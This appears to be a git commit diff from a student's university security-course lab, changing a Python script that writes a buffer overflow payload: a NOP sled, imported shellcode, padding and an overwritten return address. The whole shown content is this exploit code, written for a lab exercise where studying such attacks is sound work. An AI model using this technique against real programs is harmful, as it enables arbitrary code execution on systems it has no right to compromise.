bc996e2f6b5a6745ce8f16f590f71e9d9088a0a1
eecs388 <jack.jusko@gmail.com>
2022-11-17 00:21:37 +0000

    Automatic commit by test script for jjusko

--- sol6.py
+++ sol6.py
@@ -1,7 +1,7 @@
 from shellcode import shellcode
 import sys
-sys.stdout.buffer.write(b'\x90'*255)
+sys.stdout.buffer.write(b'\x90'*600)
 sys.stdout.buffer.write(shellcode)
-sys.stdout.buffer.write(b'A'*728)
-sys.stdout.buffer.write(0xFFF6E4A1.to_bytes(4, 'little')) #this address is probably wrong, should be right now
+sys.stdout.buffer.write(b'A'*383)
+sys.stdout.buffer.write(0xFFF6E69F.to_bytes(4, 'little')) #this address is probably wrong, should be right now
 
